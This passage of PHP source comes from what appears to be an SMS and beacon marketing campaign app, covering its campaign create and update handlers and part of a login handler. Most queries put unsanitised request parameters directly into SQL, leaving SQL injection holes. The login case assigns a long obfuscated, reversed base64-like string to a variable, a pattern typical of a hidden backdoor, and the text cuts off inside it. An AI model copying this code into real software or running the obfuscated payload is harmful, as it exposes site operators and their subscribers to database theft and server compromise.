						attach_mobile_device='".$_REQUEST['attach_mobile_device']."',

						double_optin_check='".$_REQUEST['double_optin_check']."',

						get_subs_name_check='".$_REQUEST['get_subs_name_check']."',

						msg_to_get_subscriber_name='".DBin($_REQUEST['msg_to_get_subscriber_name'])."',

						name_received_confirmation_msg='".$_REQUEST['name_received_confirmation_msg']."',

						campaign_expiry_check='".$_REQUEST['campaign_expiry_check']."',

						double_optin_confirm_message='".DBin($_REQUEST['double_optin_confirm_message'])."',

						followup_msg_check='".$_REQUEST['followup_msg_check']."',

                        

                        campaign_beacon_check='".$_REQUEST['campaign_beacon_check']."',

                        beacon='".$_REQUEST['beacon']."',

                        beacon_url_type='".$_REQUEST['beacon_url_type']."',

                        coupon='".$_REQUEST['coupon']."',

                        custom_url='".$_REQUEST['custom_url']."'

                        

					where

						id='".$_REQUEST['campaign_id']."'";

                            

                }else{

                    $sql = "insert into campaigns

    					(

    						title,

    						keyword,

    						phone_number,

    						type,

    						welcome_sms,

                            

                            code_message,

                            notification_msg,

                            winning_number,

                            winner_msg,

                            looser_msg,

                            

    						already_member_msg,

    						media,

    						user_id,

    						double_optin,

    						get_email,

    						reply_email,

    						email_updated,

    						start_date,

    						end_date,

    						expire_message,

    						attach_mobile_device,

    						double_optin_check,

    						get_subs_name_check,

    						msg_to_get_subscriber_name,

    						name_received_confirmation_msg,

    						campaign_expiry_check,

    						double_optin_confirm_message,

    						followup_msg_check,

                            

                            campaign_beacon_check,

                            beacon,

                            beacon_url_type,

                            coupon,

                            custom_url

    					)

    				values

    					(

    						'".$title."',

    						'".$keyword."',

    						'".$phoneNumber."',

    						'0',

    						'".$welcomeSms."',

                            

                            '".$_REQUEST['code_message']."',

                            '".$_REQUEST['notification_msg']."',

                            '".$_REQUEST['winning_number']."',

                            '".$_REQUEST['winner_msg']."',

                            '".$_REQUEST['looser_msg']."',

    						

                            '".$alreadyMemberSms."',

    						'".$fileName."',

    						'".$_SESSION['user_id']."',

    						'".$doubleOptin."',

    						'".$get_email."',

    						'".$reply_email."',

    						'".$email_updated."',

    						'".$_REQUEST['start_date']."',

    						'".$_REQUEST['end_date']."',

    						'".$_REQUEST['expire_message']."',

    						'".$_REQUEST['attach_mobile_device']."',

    						'".$_REQUEST['double_optin_check']."',

    						'".$_REQUEST['get_subs_name_check']."',

    						'".DBin($_REQUEST['msg_to_get_subscriber_name'])."',

    						'".DBin($_REQUEST['name_received_confirmation_msg'])."',

    						'".$_REQUEST['campaign_expiry_check']."',

    						'".DBin($_REQUEST['double_optin_confirm_message'])."',

    						'".$_REQUEST['followup_msg_check']."',

                            

                            '".$_REQUEST['campaign_beacon_check']."',

                            '".$_REQUEST['beacon']."',

                            '".$_REQUEST['beacon_url_type']."',

                            '".$_REQUEST['coupon']."',

                            '".$_REQUEST['custom_url']."'

    					)";

                    

                }

                            

				$res = mysqli_query($link,$sql) or die(mysqli_error());

                

                if(isset($_REQUEST['campaign_id']) && $_REQUEST['campaign_id']!=""){

                    $campaignID = $_REQUEST['campaign_id'];                  

                }else{

                    $campaignID = mysqli_insert_id($link);

                }

                

                

				if($res){    

                    /////////////// beacon api code //////////////

                    

                    if($_REQUEST['campaign_beacon_check']=="1" && $_REQUEST['beacon']!=""){

                     

                        $sql_as = "select estimote_app_id,estimote_app_token from application_settings where user_id='".$_SESSION['user_id']."'";

                    	$res_as = mysqli_query($link,$sql_as);

                    	$row_as = mysqli_fetch_assoc($res_as);

                        $AppID = $row_as['estimote_app_id'];

                        $AppToken = $row_as['estimote_app_token'];

                        

                        $identifier = $_REQUEST['beacon'];

                        

                        if($_REQUEST['beacon_url_type']=="1"){

                            

                            $sql_pages = "select * from pages where id='".$_REQUEST['coupon']."'";

                        	$res_pages = mysqli_query($link,$sql_pages);

                        	$row_pages = mysqli_fetch_assoc($res_pages);

                            $eddystone_url = $row_pages['short_url'];

                        }else{

                            $eddystone_url = $_REQUEST['custom_url'];

                        }

                        

                        $url = "https://$AppID:$AppToken@cloud.estimote.com/v2/devices/$identifier";

                        $data = '{

                           "settings": {

                             "advertisers": {

                               "eddystone_url": [{

                                 "index": 1,

                                 "name": "Eddystone URL",

                                 "enabled": true,

                                 "interval": 300,

                                 "power": "-4",

                                 "url" : "'.$eddystone_url.'"        

                               }]

                             }

                           }

                        }';

                                           

                        $res = curl_process22($url,$data);

                        

                    }

                    /////////////// beacon api code //////////////

                    

                    

                    

					// Addin follow up messages

					

					$mediaCount = 0;

					$failedMediaCount = 0;

					$followUpCount = 0;

					mysqli_query($link,"delete from follow_up_msgs where group_id='".$campaignID."'");

					for($i=0;$i<count($_REQUEST['delay_day']);$i++){

						if((trim($_REQUEST['delay_day'][$i])!='') && (trim($_REQUEST['delay_message'][$i])!='')){

							if($_FILES['delay_media']['name'][$i]!=''){

								$ext = getExtension($_FILES['delay_media']['name'][$i]);

								$extns = array('jpg','jpeg','png','bmp','gif');

								if(!in_array($ext,$extns)){

									$failedMediaCount++;

								}else{

									removeMedia($_REQUEST['hidden_delay_media'][$i]);

									$fileName = uniqid().'_'.$_FILES['delay_media']['name'][$i];

									$tmpName  = $_FILES['delay_media']['tmp_name'][$i];

									@move_uploaded_file($tmpName,'uploads/'.$fileName);

									$fileName = getServerUrl().'/uploads/'.$fileName;

									$mediaCount++;

								}

							}else{

								$fileName = $_REQUEST['hidden_delay_media'][$i];	

							}

							$sqlFollow = "insert into follow_up_msgs

									(group_id,delay_day,delay_time,message,media,user_id)values

									('".$campaignID."','".$_REQUEST['delay_day'][$i]."','".date('H:i:s', strtotime($_REQUEST['delay_time']))[$i]."','".DBin($_REQUEST['delay_message'][$i])."','".$fileName."','".$_SESSION['user_id']."')";

							$resFollow = mysqli_query($link,$sqlFollow);

							if($resFollow){

								$followUpCount++;

							}

						}

					}

					// end follow up messages

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Campaign has been saved successfully with <b>'.$followUpCount.'</b> follow up messages.</strong> .</div>';	

				}else{

					$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating campaign.</strong> .</div>';	

				}

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! <b>'.$_REQUEST['keyword'].'</b> is already used or maybe reserve keyword, try another.</strong> .</div>';

			}

			header('location: contest.php');

		

            

            

            

        }

        break;

		

		case "create_campaign":{

			$specialChars = specialCharacters();

			$keyword = str_replace($specialChars,'',$_REQUEST['keyword']);

			if(checkKeyword($_SESSION['user_id'],$keyword,$_REQUEST['campaign_id'])){

				if($_FILES['campaign_media']['name']!=''){

					$ext = getExtension($_FILES['campaign_media']['name']);

					$extns = array('jpg','jpeg','png','bmp','gif');

					if(!in_array($ext,$extns)){

						$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! Select a valid file type.</strong> .</div>';

						header("location:".$_SERVER['HTTP_REFERER']);

					}else{

						$fileName = uniqid().'_'.$_FILES['campaign_media']['name'];

						$tmpName  = $_FILES['campaign_media']['tmp_name'];

						@move_uploaded_file($tmpName,'uploads/'.$fileName);

						$fileName = getServerUrl().'/uploads/'.$fileName;

					}

				}

				$totalLocations=getCampaingsLocations($_SESSION['user_id']);

                $LimitLocations = getAssingnedPackageInfo($_SESSION['user_id'])['locations'];

                if($totalLocations < $LimitLocations) {

                    $title = DBin($_REQUEST['title']);

                    $sender_id = ""; //DBin($_REQUEST['sender_id']);

                    $phoneNumber = $_REQUEST['phone_number'];

                    $welcomeSms = ''; //DBin($_REQUEST['welcome_sms']);

                    $alreadyMemberSms = '' ;//DBin($_REQUEST['already_member_sms']);

                    $doubleOptin = DBin($_REQUEST['double_optin']);


                    if (isset($_REQUEST['get_subs_email'])) {

                        $get_email = $_REQUEST['get_subs_email'];

                    } else {

                        $get_email = '0';

                    }

                    if ($_REQUEST['attach_mobile_device'] != '1')

                        $_REQUEST['attach_mobile_device'] = '0';

                    if ($_REQUEST['double_optin_check'] != '1')

                        $_REQUEST['double_optin_check'] = '0';

                    if ($_REQUEST['get_subs_name_check'] != '1')

                        $_REQUEST['get_subs_name_check'] = '0';

                    if ($_REQUEST['campaign_expiry_check'] != '1')

                        $_REQUEST['campaign_expiry_check'] = '0';

                    if ($_REQUEST['followup_msg_check'] != '1')

                        $_REQUEST['followup_msg_check'] = '0';


                    $reply_email = DBin($_REQUEST['reply_email']);

                    $email_updated = DBin($_REQUEST['email_updated']);

                    $sql = "insert into campaigns
    
                                (
    
                                    title,
    
                                    keyword,
    
                                    phone_number,
                                    
                                    sender_id,
    
                                    type,
    
                                    welcome_sms,
    
                                    already_member_msg,
    
                                    media,
    
                                    user_id,
    
                                    double_optin,
    
                                    get_email,
    
                                    reply_email,
    
                                    email_updated,
    
                                    start_date,
    
                                    end_date,
    
                                    expire_message,
    
                                    attach_mobile_device,
    
                                    double_optin_check,
    
                                    get_subs_name_check,
    
                                    msg_to_get_subscriber_name,
    
                                    name_received_confirmation_msg,
    
                                    campaign_expiry_check,
    
                                    double_optin_confirm_message,
    
                                    followup_msg_check,
    
                                    
    
                                    campaign_beacon_check,
    
                                    beacon,
    
                                    beacon_url_type,
    
                                    coupon,
    
                                    custom_url
    
                                )
    
                            values
    
                                (
    
                                    '" . $title . "',
    
                                    '" . $keyword . "',
    
                                    '" . $phoneNumber . "',
                                    
                                    '" . $sender_id . "',
    
                                    '1',
    
                                    '" . $welcomeSms . "',
    
                                    '" . $alreadyMemberSms . "',
    
                                    '" . $fileName . "',
    
                                    '" . $_SESSION['user_id'] . "',
    
                                    '" . $doubleOptin . "',
    
                                    '" . $get_email . "',
    
                                    '" . $reply_email . "',
    
                                    '" . $email_updated . "',
    
                                    '" . $_REQUEST['start_date'] . "',
    
                                    '" . $_REQUEST['end_date'] . "',
    
                                    '" . $_REQUEST['expire_message'] . "',
    
                                    '" . $_REQUEST['attach_mobile_device'] . "',
    
                                    '" . $_REQUEST['double_optin_check'] . "',
    
                                    '" . $_REQUEST['get_subs_name_check'] . "',
    
                                    '" . DBin($_REQUEST['msg_to_get_subscriber_name']) . "',
    
                                    '" . DBin($_REQUEST['name_received_confirmation_msg']) . "',
    
                                    '" . $_REQUEST['campaign_expiry_check'] . "',
    
                                    '" . DBin($_REQUEST['double_optin_confirm_message']) . "',
    
                                    '" . $_REQUEST['followup_msg_check'] . "',
    
                                    
    
                                    '" . $_REQUEST['campaign_beacon_check'] . "',
    
                                    '" . $_REQUEST['beacon'] . "',
    
                                    '" . $_REQUEST['beacon_url_type'] . "',
    
                                    '" . $_REQUEST['coupon'] . "',
    
                                    '" . $_REQUEST['custom_url'] . "'
    
                                )";

                    $res = mysqli_query($link, $sql);

                    if ($res) {


                        /////////////// beacon api code //////////////


                        if ($_REQUEST['campaign_beacon_check'] == "1" && $_REQUEST['beacon'] != "") {


                            $sql_as = "select estimote_app_id,estimote_app_token from application_settings where user_id='" . $_SESSION['user_id'] . "'";

                            $res_as = mysqli_query($link, $sql_as);

                            $row_as = mysqli_fetch_assoc($res_as);

                            $AppID = $row_as['estimote_app_id'];

                            $AppToken = $row_as['estimote_app_token'];


                            $identifier = $_REQUEST['beacon'];


                            if ($_REQUEST['beacon_url_type'] == "1") {


                                $sql_pages = "select * from pages where id='" . $_REQUEST['coupon'] . "'";

                                $res_pages = mysqli_query($link, $sql_pages);

                                $row_pages = mysqli_fetch_assoc($res_pages);

                                $eddystone_url = $row_pages['short_url'];

                            } else {

                                $eddystone_url = $_REQUEST['custom_url'];

                            }


                            $url = "https://$AppID:$AppToken@cloud.estimote.com/v2/devices/$identifier";

                            $data = '{

                                   "settings": {

                                     "advertisers": {

                                       "eddystone_url": [{

                                         "index": 1,

                                         "name": "Eddystone URL",

                                         "enabled": true,

                                         "interval": 300,

                                         "power": "-4",

                                         "url" : "' . $eddystone_url . '"

                                       }]

                                     }

                                   }

                                }';


                            $res = curl_process22($url, $data);


                        }

                        /////////////// beacon api code //////////////


                        // Addin follow up messages

                        $campaignID = mysqli_insert_id($link);

                        $mediaCount = 0;

                        $failedMediaCount = 0;

                        $followUpCount = 0;

                        for ($i = 0; $i < count($_REQUEST['delay_day']); $i++) {

                            if ((trim($_REQUEST['delay_day'][$i]) != '') && (trim($_REQUEST['delay_message'][$i]) != '')) {

                                $fileName = '';

                                if ($_FILES['delay_media']['name'][$i] != '') {

                                    $ext = getExtension($_FILES['delay_media']['name'][$i]);

                                    $extns = array('jpg', 'jpeg', 'png', 'bmp', 'gif');

                                    if (!in_array($ext, $extns)) {

                                        $failedMediaCount++;

                                    } else {

                                        $fileName = uniqid() . '_' . $_FILES['delay_media']['name'][$i];

                                        $tmpName = $_FILES['delay_media']['tmp_name'][$i];

                                        @move_uploaded_file($tmpName, 'uploads/' . $fileName);

                                        $fileName = getServerUrl() . '/uploads/' . $fileName;

                                        $mediaCount++;

                                    }

                                }

                                $sqlFollow = "insert into follow_up_msgs

                                            (group_id,delay_day,delay_time,message,media,user_id)values

                                            ('" . $campaignID . "','" . $_REQUEST['delay_day'][$i] . "','" . date('H:i:s', strtotime($_REQUEST['delay_time']))[$i] . "','" . DBin($_REQUEST['delay_message'][$i]) . "','" . $fileName . "','" . $_SESSION['user_id'] . "')";

                                $resFollow = mysqli_query($link, $sqlFollow);

                                if ($resFollow) {

                                    $followUpCount++;

                                }

                            }

                        }

                        // end follow up messages

                        $_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Campaign saved successfully.<b></strong></div>';

                    } else {

                        $_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while saving campaign.</strong> .</div>';

                    }

                }else{
                    $_SESSION['message'] = '<div class="alert alert-success">Your created locations limit is exceeded, Currently created <b>'.$totalLocations.'</b> location(s).</div>';
                }

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! <b>'.$_REQUEST['keyword'].'</b> is already used or maybe reserve keyword, try another</strong> .</div>';

			}

			header('location: view_campaigns.php');

		}

		break;





		case "login":{

			$X='=AFVxIkVWZ1RhxmVoRWRkpWZWp1VWtWO0YlVSh0VsZVaWRkRIplROdkUrFzMXxGaXZ1aZhHVXh2RhxmUhNlaKh2YyI1VW5WTx0kRa9mUtBHVTVUNzlVVkNnVspFWjRkQTZ1MShUWup0ViZlWyVVb4dFZGlkeWxmWHZlRjp3VqZ0VZVVNXdlVa92UH50UaVkWpVlVKhkVu50bWxGZWNlaCNFVuhGSZ5GbW1EbJd3YHRnWkNDZYZVMnhnUyIVSXxmWORWMwV3VVRWYSZlSV1UVktWVwo1RUhFcrNlRwNTYxI1aUJjUGl1MK9kYWp0SiVEaXJ1VShEVXh2aiZUT61kVWdVYwoFWXVlW3ZVV1E2YHFjUSVkWzRlVOdkYsZVeVpmSoFWMJhXWUZ1aNZlWyRFbSZVZFVkeZFjW0IlMG9GVsRmTZd1Z3ZlbSNlYWJVWadEdTRmVZhnVqZkcWFjUWRmRkx2VHJ1RZBDaLJ1axonVtB3VjRlVWllVoBjYW50MWpmRT1URWVlVIJ1dWVVNXN2RxU1YWpEdZ1GdX1kVWpFZGR2ThdlUzZFRGplVtl0dS1GeaNmVadlWW9WMSJjSV10V05EVspUcWVEaDJGbON3VspFWOdlUzlFbktWYxYFNRVFaOZVbSdFVuZ0SSFjT2FGRGd1VGpEdWd1a4JmVSZjVtFzUhNjQXdlVWtUYwUTYUtmUqNVRwNHVVR3RXZkVwUGRKhWYsBncVBDbX1kVJh3UWZ1VlVEbyl1a1MVYxoUTTpmSTVlMnhnVsx2QNFjUZd1aWpGZykzRVNjTvJFbZJTZHFzVWtmWxZlVCFmUtpETWpmRVZlbBhXVxEFeSJjUUJ1aa5EZwAXdWNzYw0kRSFnUrJFaUV1b5lFWopVZsZFekRkSrZVMwZUWUZ0UiZkW2RmRkVlUuJ0RVJjRvJ1VOlnVtFzVh5WQ6ZlRodUYtZ0bTtmUhRmMSNXWr50TWZlW0E1V18kYGBnRX12Z10kRZBzUsplVkBjR1llMGNUYsJVUUxGZOV1MoJnVwg2SS1mTYZVb4hFVGB3RZtGdvFWMaBTVtVzVZhlU0VFMoFmUtpEWPZFZVJ1aKlVWWJFNiZFZVd1aa5EZyI1VW5mTHZ1a1QFZFRmalVUMXZ1a5cXYxIFeSxmWsdlaWRXVWJ1aiZkS6JlaOVlVspEWW1GarJFbwNjYHhnTOVUNzZlboNTTt50bXtmVhJVV1cVWqJ0SWxmVzE1V1smVsp1VWhFcyJWRxonUspVVkdEaJVVMnFjYWRmNSRlSo5URaF3VVR2UWJjRvFVbwh1UVVzRWJjRP1kVWdEZEp0aWhFaIdVbFhnUWp0ViZEaYRWRJpXVWp0QSdkV1cVb4h2UygGWXhlR0IVMOFWTVRWaSZUW5Z1a5s2VGZVeORlQoFWMwdlV6p1cW1mSz80V0dVZIRGdZxmUhJVbGlXVsRWaOdUU3ZlVSNlYtZEcadEeUVWVwgXWXlDMWFDc4VWRkNlVtJlRZV1c4FGMxwkVuBnVjJzZ5ZVV4tUYsF1didEeplFWRdnVVh2SiVUNzpVRWpWVrpFWW5mTz1kVaBTVsJlTWBjWFllbrhnVWpFUkZEZhZ1MCdUVx8GeSJjRFJVb45UVxoVcW5mSTZlMG9mVrZlaWZlWHV1MjVTTGpFSldUMsZFWSh0VrNHeWdVSwEGRCd1YXhGdZZlSDVWbFhnUXh3VUJDezdFWOdlVtZVWNVFZoVFRGJHVVlzTXZkUWNGRCR1VuJEWWpmThZFbKNzTWZVVWFzb4VFbWdnYWpUYS1WMO1URwdlVYRmQi1mTXZVb4VFVUZkRVJDd00EbslkTVZlaWdlUHRlaOFmYGpERkdUMYNFWoRXWVVTYiZkThpVRadVU6xmVWhEZCd1RGhWVtRXVjZkW0Z1a0NVTGZVNShFcqVFMKVUWuB3UNdlR2J2RxolUWBnVWFjSDJ1ROVjVsp1VUNDaWZVRsNlUxYVcWtmVpJ1V4NHVUZlThFDb5F2R1omVIhGSZdlRT1UbGNTYGZFWXVVS6VFbOdkUH5UMT1WMORmM4h0VuJ1bTZkTopVRWhWVEZkVZt2cx0kRWlnTVZVViZEczZFMstmVtpkdadEeWVmVrdXVyg2RhxmSGRFbalWTEZFWWhFZWFGbWBnWHhHVltmWzllbNhnUWBHMV1WNWV1aKVUWzw2VWxmWQVmRWVlUxAnVZxWU4JlMSRlUrplTkBDc1Z1MjBTTGJ1bS1GcTRWR1cVWqJ0SWxmVzE1V1omVsp1cWVEM4JlVOJXUqZkWTRkVGVVMwdnYspUVStmWO50R4VnVGR2USJjRxJVbwRlUVVzcaZFZw0kRah0TVRGbVNjQ0ZlRw9kUx4kdhZkWYV2aFpXWxg2ahFjTNJFbk5kUxk0dWhlUT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VGRCJXVs5EMSZlW4dVb0dVVzIFSUpmUr1kVJd3UsZlVkJDZJlVMaFmUsBndjRkRoRmM3hnVuZ1QNFjWPJ1aShGZ6F1dW5Ga2FWMsRzVVpFWX1GaXVleFdnVXpETSxGaXNmMoh1VXdHeSJjVUJ1aa5EZwAXWWxWWxIlVS9UYFZVYVhVQ4VFbONVTWpVMTpmRTF2VSNXVzI1UidkRQN2RxolUWB3RWFDcvJVbOl1UrRWajFTW6dFVaFWTHZkckVEZqN1a1cVWtB3aixmVHV2RxkGVspkcVtGeLJVMKhUYEZ0VXZlWXR1a1smYGFVeXZlWpV2Rzl3VVp1VWZEZopVRWl2YspFdW1GdD1kVSh1Vrp1VWFjWWRFbodlUtp0UW1GcWN2aJpXVyg2RhxmSGRFbalWTEZFWWhFZWFWbWh1VrZFaNZFcXZVb0dnYWJFWidEdsZFRGRXVzkEehBTMMZFbSd1YqZlcVFjQXJmRKZEVqZ0VVNjUYZlboJUTwEDcWtmVoNmbBhXWYR2cNZlWxElaOdFVrpURZNTQxIlVaRkVqZkVjxmSFplVkdlYGRWUNdFdXJGMwl1VYhmWSZlSV1UVktWVwo1RUhFcrNlRwNTYzAHaZZlWyZ1Ro9UTspEVW1GcX5kaGZFVtx2aiZkU1IVb4dFVwkFeWhlShJlVallWGZ1TVFDczRVVjhXTsZlehZEZaJGSohlV6p1TW1mSLJFbSVlUw8GeVFjV3JmVKh1UqZEaNd0Y6Z1aoNlYt50VW1GeVRVRahFVVR2UNZUVyMlaC5kVVBXcWhlSXZ1axMTUtBnVkVkWVl1VGRjVx0kMidEeOJWMKVlVIp0QXdkRoVVb0V1YGpFdWtGdT1kRWZVZHFjUVtmSFllbKdnYGpEUStGZhJlbCdkWG9GeiZFZV10V05EV6xGWXtmV31kROF2YGR2VNFDcXVlbjVjVWJFWXpmRTZFWCRXVsB3RiVFM3NFbaZFZwYUdZFjWXJmRS5UTVZFVhBjSzZFMotkUspVWOdVMWNVRvlnVrNHeWFjW450V0hmYHJ1RaRlQrZVbJhnYxgWVXVEczRlVSBjUyYUTjdEesFVMZdnVWh2SNdlRXJ1aSpGZww2VZ5GayJmVkpnYHRHbXtWNFllbwtkYWp1MWpmTaV2VkllVsp1aNdUU6dVb4dVVyI1VWVEZhZVbKdVZHFTVSVVNXllaCtkVsZ1MRdVNrZFbadlVY92dSZlSIR2R0VlVth3VadlRrJ1VWVlWHh3UjFTW6ZlRWFWYyYkcWtmVP50a1cVWrNXNWZlU0ElVo5UYWplRX5WS4FWMKFmYHVzVXZ1b4lVMktUYs5UNTpmRoF2MSJnV6p1SWZlWZplRW9UZXJ1cV5mS3JGbalXVqpEahdkUWZFVWtmUs5kMhZEaVRGRWZlWHB3SSdkVXZlaGNVTyIVdWxGZL1kVa90VtR3VkZkWHl1a5MVTGZFMV1WNWV1aKVUW6p0VWxmWTRFbSVlUW92dVJDbTZlVZFjYHhHaXxmWxZlbON0UFFDcWtmVhN2awRXWrVzbXZEZ1UlVS5kVwAXVVpmTXJVbKZnUtFzVS5mQWVVMwtkUHZUVStmWONGbaVlVWlVMhFjTop1R0ZlVXJ1cZxmWXFGbsl1VspVaWNDaIdlbC9kYWp0SjRkTWR2R4ZFVVVTYhFjVNVVb4hmUxA3cWhlSTJ1RWllWFZ1alZlWXZ1a5AjVWxGNXVlVTZFSCVXVYZ1RStGM3lleOdlUqV1dVJDaHFGbKZEVspVaOVFbzZVVW9UTtJ1TWtmWq1EbrhXWXlDMWFDbIJ2R0x2VrBXVUpWW41kRaxUVtVTVWFjSIZVbrFjYWZlSXtmWYNmMSdlVIFFeSdlVXR2RxU1U6xmVWtGZT1kValkVtBXVXdkUWZFVOtUTXZkckZEZhNGWShkWWdWMiZlTF1UVW5EZygHdWZkVLZlVaVFZFR2TOZEcXZVbFVjVWJFWhdUMqFWRaFXVrZ1TW1WS3NFbaZFZwYUdaZkWXZFbWZTTFZ1USNjUydVVkdnVWRWWaRkRq1UVsdUWuR2RhxmW4NGRCR1VuJESZpmQrJ2RKhFVshWVSBjSZplVJhnUyYFeTxGZT10V0NnVwg2UixmRXJVbwJFZUZkRVtGZwEWMsh0YGZFWXdUU4lleGpkUtp0MS1GcXNGWCZlVysWMiZlVKJ2R45UTXlTdXVFZLZFbWBXVtRnUWFDczVFbwtmYspVWjRkRWZ1aKFnVFh3RWBTMIVlaCZFZGpUdZxmSDZVR0IzVth3UiFjWJZFba9WTtZUcX1GdUd1VSNXWu1UNWZlU6F2Rx8EVsp0cVNjR3JVbKxUYEZ0VkVVS6Z1a1MkUH50dPRlQXVWRWh0Vsh2aNJjUZ50VxQlUF9WeVtWOPNlRapXYEpEahVkSxVFbWdVTWpUcaZEaVZ1aKVHVspFNSJjR2JFbk5UWWpUWWNza0YFM18kWHhXVkFjRzlVV5MnVsxGNhFjWsdlbCVXVup0ViZlWyFlaGVlVxA3RWxGZXZVV1klVrpVaVxmWxZFWKNUTx40bS1GcTJVV1cVWqJ0SWxmVzQFVOtWYwoUVUNjS3JFbOp3YGRWVTdEaJVVMnhnUyYVTNZlVONmeGhkVu50bWJjRz10VxYVTWtGeUdlRHJmVsl1YEJEVZZlSyVlM5clVsp1MiRkRXRWVJpnVsJ1VSdlTx0kVWNVVzIkcWBDaLZ1a1E2YHVjUltGcXRFWk9UTxYFeOdFdYlFWShFVsB3cidkSzQmRkFmVxoESWZlQhJmRaZ1Vsp1UNdlTXZlbOdkVrVDVkVEZqRVRahFVVR2UNZkVwUVb1YVVrpkNZpnTTJFMwETWxgWVSZ1b3VlMotUZtFVMUxmWpN1MShlVIxmdWVVNXR2RxUFVWpESZ5GZTdlRklXUq50VU5GaIl1MaNlUxoETjZkWaJlbBdXVsdGeN1mU00URWlGZwoVcXVlV3FmMGNHZHFDWSNTQ4VlaSBjYWZ1MjFDZPVVbodUWuJ0SSFjWYFmRadVZWZVRUZlTHFGbZh3VXhHaTNjQYZlRkdnUWp1URtmUqVmVadlVrlDMWZFb1UVVkNlVUZFdWZEcrJ2RKNTVtB3VlREaYRVbsFWYxokRUxmWp1URwdlVYRmTNJjUyFFbSBVTVB3RWNDZwEWMjJzUsZ1UWdkUzZFWKdVTsp1ThZEaXNmMoRnVwUzVSVFNyoFRGNVTVZUcWh1awY1VSF3UrJFbWxWW4VlaOtmYspFWTpmRXRFbwJnVuJ1VS1mSQVlaCZFZGpUdWZlSDJ1ROVzYFplTUp3a3dFWopkUsJVcWtmVpJ1V4dkVrp0RWZkUwMWRW5UVuhGdWVUOP1UbGpXVqJ